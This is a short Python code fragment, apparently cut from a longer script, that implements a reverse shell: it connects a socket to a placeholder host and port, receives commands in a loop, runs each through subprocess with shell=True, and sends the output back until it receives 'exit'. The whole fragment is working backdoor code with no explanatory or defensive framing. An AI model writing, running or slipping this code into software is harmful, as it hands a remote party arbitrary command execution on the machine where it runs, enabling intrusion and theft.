
s.connect(('<HOST>', <PORT>))


while 1:
    cmd = s.recv(2048)
    if cmd == "exit":
        break
    shell = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    s.send(shell.stdout.read() + shell.stderr.read())
s.close()

